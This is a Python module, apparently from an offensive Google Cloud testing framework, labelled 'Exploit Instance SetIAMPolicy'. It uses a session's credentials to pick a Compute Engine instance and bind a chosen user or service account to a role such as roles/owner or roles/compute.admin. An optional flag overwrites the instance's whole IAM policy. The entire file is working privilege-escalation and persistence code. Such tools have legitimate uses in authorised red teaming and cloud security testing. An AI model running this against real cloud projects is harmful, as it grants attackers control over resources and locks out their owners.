from Modules.CloudCompute.utils.util_helpers import *

# Entrypoint
def run_module(user_args, session, first_run = False, last_run = False):
    
    # Set up Argparser to handle flag arguments
    parser = argparse.ArgumentParser(description="Exploit Instance SetIAMPolicy", allow_abbrev=False, output_format = ["table"])
    
    # Module specific arguments
    parser.add_argument("--instance-name", type=str, required=False,  help="Instance name to set IAM policy on (format - projects/<project_id>/zones/<zone>/instances/<instance-name>)")

    parser.add_argument("--role", type=str, required=False,  help="Role to add (format - roles/<role_name>)")
    parser.add_argument("--member", type=str, required=False,  help="User to add to the policy at the given role (format - user:<email> / serviceAccount:<email>)")
    parser.add_argument("--overwrite", action="store_true", required=False,  help=f"{UtilityTools.RED}{UtilityTools.BOLD}WARNING: Potentially overwrite entire instance policy{UtilityTools.RESET}")

    # Debug/non-module specific
    parser.add_argument("-v","--debug",action="store_true",required=False,help="If current policy is unknown, potentially rewrite all policy")

    args = parser.parse_args(user_args)

    debug = args.debug

    action_dict = {}

    instance_client = compute_v1.InstancesClient(credentials = session.credentials)  

    instance_name, instance_zone, instance_project_id, member, role = None, None, None, None, None

    # Take care of everything user supplied
    if args.instance_name:

        instance_summary = args.instance_name

        status, incorrect_input = UtilityTools.validate_input_format(instance_summary, 6)
        if status != 0: 
            print(f"{UtilityTools.RED}[X] Value \"{incorrect_input}\" is incorrect. Must be 'projects/[project_id]/zones/[zones]/instances/[instance_name] Please try again...{UtilityTools.RESET}")
            return -1

        instance_project_id = instance_summary.split("/")[1]
        instance_zone = instance_summary.split("/")[3]
        instance_name = instance_summary.split("/")[5]

    if args.member:

        member = args.member
        status, incorrect_input = UtilityTools.validate_user_format(member)
        if status != 0: 
            print(f"{UtilityTools.RED}[X] Value \"{incorrect_input}\" is incorrect. Must be 'user:[email]' or 'serviceAccount:[email]' Please try again...{UtilityTools.RESET}")
            return -1

    if args.role:
        role = args.role

    # Take care of everything user did not supply
    if not instance_name:

        rows_returned = session.get_data("cloudcompute-instances", columns = ["name","status","zone","project_id"])
        
        if len(rows_returned) == 0:
            print("[X] No instances were found when running the module. Consider passing in the specified instances name with --instance-name flag when running the module again")
            return -1
        
        for instance in rows_returned:
            local_instance_name = instance["name"]
            local_instance_status = instance["status"]
            local_instance_zone = instance["zone"].split("/")[-1]
            local_instance_project_id = instance["project_id"]

            instance["printout"] = f"[{local_instance_project_id}] {local_instance_name} (@ {local_instance_zone}) - STATUS: {local_instance_status}"

        # Return dictionary corresponding to user choice
        rows_returned = sorted(rows_returned, key=lambda x: x["zone"])

        instance_dict = session.choice_selector(rows_returned,"Choose an existing instance from below to edit the corresponding policy::", fields=["printout"])
        
        if instance_dict:
            instance_name = instance_dict["name"]
            instance_zone = instance_dict["zone"].split("/")[-1]
            instance_project_id = instance_dict["project_id"]
        
        else:
            print("[X] Exiting...")
            return None

    if not member:
        member = session.choose_member()
        if not member:
            print("Exiting...")
            return -1

    if not role:
        allowed_instance_roles_menu = [
            "roles/compute.admin",
            "roles/owner",
            "roles/editor",
            "roles/viewer"
        ]
        role = session.choose_role(allowed_instance_roles_menu, chosen_role = args.role, default_role = "roles/compute.admin")
        if not role:
            print("Exiting...")
            return -1

    if debug:
        print(f"[DEBUG] Proceeding with Instance: {instance_name}")
        print(f"[DEBUG] Proceeding with member: {member}")
        print(f"[DEBUG] Proceeding with role: {role}")

    print(f"[*] Binding Member {member} on {instance_name} to role {role}")

    status = add_instance_iam_member(instance_client, instance_name, instance_project_id, instance_zone, member, action_dict, brute = args.overwrite, role = role, debug=debug)

    if status:
        if status == -1:
            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] Failed to add {member} to policy of instance {instance_name}{UtilityTools.RESET}")
        else:
            print(f"{UtilityTools.GREEN}{UtilityTools.BOLD}[*] Successfully added {member} to the policy of instance {instance_name}{UtilityTools.RESET}")

    if action_dict:
        session.insert_actions(action_dict, instance_project_id, column_name = "compute_actions_allowed") 